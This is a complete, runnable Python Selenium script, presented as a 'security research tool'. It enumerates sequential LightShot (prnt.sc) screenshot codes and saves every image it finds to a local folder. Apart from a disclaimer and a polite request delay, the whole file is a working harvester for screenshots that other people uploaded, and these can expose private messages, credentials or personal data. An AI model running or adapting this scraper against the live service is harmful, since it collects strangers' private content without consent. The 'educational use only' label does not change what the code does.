#!/usr/bin/env python3
"""
LightShot Security Research Tool

This script demonstrates security vulnerabilities in LightShot's URL structure
by systematically accessing screenshots through predictable URL patterns.

DISCLAIMER: This tool is for educational and research purposes only.
Do not use this tool for malicious purposes or unauthorized access.
Always respect rate limits and terms of service.

Author: NC1107
License: Educational Use Only
"""

import os
import sys
import string
import time
import logging
import argparse
from pathlib import Path
from typing import Optional, Generator, Tuple

from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import (
    TimeoutException,
    NoSuchElementException,
    WebDriverException,
)


class LightShotResearcher:
    """
    A class to demonstrate LightShot URL structure vulnerabilities.

    This class provides functionality to systematically access LightShot
    screenshots through predictable URL patterns for security research.
    """

    BASE_URL = "https://prnt.sc/"
    ALPHABET = string.ascii_lowercase
    DIGITS = [str(i) for i in range(10)]

    def __init__(
        self, driver_path: str, output_dir: str = "images", headless: bool = True
    ):
        """
        Initialize the LightShot researcher.

        Args:
            driver_path: Path to ChromeDriver executable
            output_dir: Directory to save screenshots
            headless: Run browser in headless mode
        """
        self.driver_path = driver_path
        self.output_dir = Path(output_dir)
        self.headless = headless
        self.driver: Optional[webdriver.Chrome] = None
        self.session_count = 0

        # Setup logging
        self._setup_logging()

        # Ensure output directory exists
        self.output_dir.mkdir(exist_ok=True)

        # Initialize WebDriver
        self._initialize_driver()

    def _setup_logging(self) -> None:
        """Configure logging for the application."""
        logging.basicConfig(
            level=logging.INFO,
            format="%(asctime)s - %(levelname)s - %(message)s",
            handlers=[
                logging.FileHandler("lightshot_research.log"),
                logging.StreamHandler(sys.stdout),
            ],
        )
        self.logger = logging.getLogger(__name__)

    def _initialize_driver(self) -> None:
        """Initialize Chrome WebDriver with appropriate options."""
        try:
            chrome_options = Options()

            if self.headless:
                chrome_options.add_argument("--headless")

            # Security and performance options
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument(
                "--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            )

            service = Service(executable_path=self.driver_path)
            self.driver = webdriver.Chrome(service=service, options=chrome_options)
            self.driver.set_page_load_timeout(10)

            self.logger.info("WebDriver initialized successfully")

        except Exception as e:
            self.logger.error(f"Failed to initialize WebDriver: {e}")
            raise

    def _generate_url_codes(self) -> Generator[str, None, None]:
        """
        Generate all possible URL codes in the format: [a-z][a-z][0-9][0-9][0-9][0-9]

        Yields:
            str: URL code combinations
        """
        for letter1 in self.ALPHABET:
            for letter2 in self.ALPHABET:
                for num1 in self.DIGITS:
                    for num2 in self.DIGITS:
                        for num3 in self.DIGITS:
                            for num4 in self.DIGITS:
                                yield f"{letter1}{letter2}{num1}{num2}{num3}{num4}"

    def _capture_screenshot(self, url_code: str) -> Tuple[bool, str]:
        """
        Attempt to capture a screenshot from a LightShot URL.

        Args:
            url_code: The URL code to attempt

        Returns:
            Tuple of (success, message)
        """
        url = f"{self.BASE_URL}{url_code}"
        output_path = self.output_dir / f"{url_code}.png"

        try:
            self.driver.get(url)

            # Wait for page to load and try multiple selectors
            wait = WebDriverWait(self.driver, 5)

            # Try different selectors for LightShot's changing page structure
            selectors = [
                ".screenshot-image",
                "#screenshot-image",
                ".image",
                "img[src*='image']",
                ".image-container img",
                ".no-click",
                "#screenshot img",
            ]

            image_element = None
            for selector in selectors:
                try:
                    image_element = wait.until(
                        EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                    )
                    break
                except TimeoutException:
                    continue

            if image_element is None:
                # If no specific element found, try to screenshot the main content area
                try:
                    image_element = self.driver.find_element(By.TAG_NAME, "body")
                except NoSuchElementException:
                    return False, f"No image element found at {url}"

            # Take screenshot of the specific element
            if image_element.screenshot(str(output_path)):
                self.session_count += 1
                return True, f"Screenshot saved: {output_path}"
            else:
                return False, "Failed to save screenshot"

        except TimeoutException:
            return False, f"Timeout loading {url}"
        except NoSuchElementException:
            return False, f"Image not found at {url}"
        except WebDriverException as e:
            return False, f"WebDriver error: {e}"
        except Exception as e:
            return False, f"Unexpected error: {e}"

    def research_vulnerabilities(
        self, max_attempts: int = 1000, delay: float = 1.0
    ) -> None:
        """
        Conduct systematic research of LightShot URLs.

        Args:
            max_attempts: Maximum number of URLs to attempt
            delay: Delay between requests in seconds
        """
        self.logger.info(f"Starting research with max {max_attempts} attempts")
        self.logger.info(f"Delay between requests: {delay} seconds")

        successful_captures = 0

        try:
            for i, url_code in enumerate(self._generate_url_codes()):
                if i >= max_attempts:
                    break

                success, message = self._capture_screenshot(url_code)

                if success:
                    successful_captures += 1
                    self.logger.info(f"Success ({successful_captures}): {message}")
                else:
                    self.logger.debug(f"Failed: {message}")

                # Progress update every 100 attempts
                if (i + 1) % 100 == 0:
                    self.logger.info(
                        f"Progress: {i + 1}/{max_attempts} attempts, "
                        f"{successful_captures} successful captures"
                    )

                # Respectful delay to avoid overwhelming the server
                time.sleep(delay)

        except KeyboardInterrupt:
            self.logger.info("Research interrupted by user")
        except Exception as e:
            self.logger.error(f"Research failed: {e}")
        finally:
            self.logger.info(
                f"Research completed. Total successful captures: {successful_captures}"
            )

    def cleanup(self) -> None:
        """Clean up resources."""
        if self.driver:
            try:
                self.driver.quit()
                self.logger.info("WebDriver closed successfully")
            except Exception as e:
                self.logger.warning(f"Error closing WebDriver: {e}")


def main():
    """Main entry point for the application."""
    parser = argparse.ArgumentParser(
        description="LightShot Security Research Tool",
        epilog="DISCLAIMER: For educational and research purposes only!",
    )

    parser.add_argument(
        "--driver-path",
        default="driver/chromedriver_win32 (1)/chromedriver.exe",
        help="Path to ChromeDriver executable",
    )

    parser.add_argument(
        "--output-dir", default="images", help="Directory to save screenshots"
    )

    parser.add_argument(
        "--max-attempts",
        type=int,
        default=1000,
        help="Maximum number of URLs to attempt",
    )

    parser.add_argument(
        "--delay", type=float, default=1.0, help="Delay between requests in seconds"
    )

    parser.add_argument(
        "--visible",
        action="store_true",
        help="Run browser in visible mode (not headless)",
    )

    args = parser.parse_args()

    # Validate driver path
    if not os.path.exists(args.driver_path):
        print(f"Error: ChromeDriver not found at {args.driver_path}")
        sys.exit(1)

    researcher = None
    try:
        researcher = LightShotResearcher(
            driver_path=args.driver_path,
            output_dir=args.output_dir,
            headless=not args.visible,
        )

        researcher.research_vulnerabilities(
            max_attempts=args.max_attempts, delay=args.delay
        )

    except KeyboardInterrupt:
        print("\nResearch interrupted by user")
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)
    finally:
        if researcher:
            researcher.cleanup()


if __name__ == "__main__":
    main()
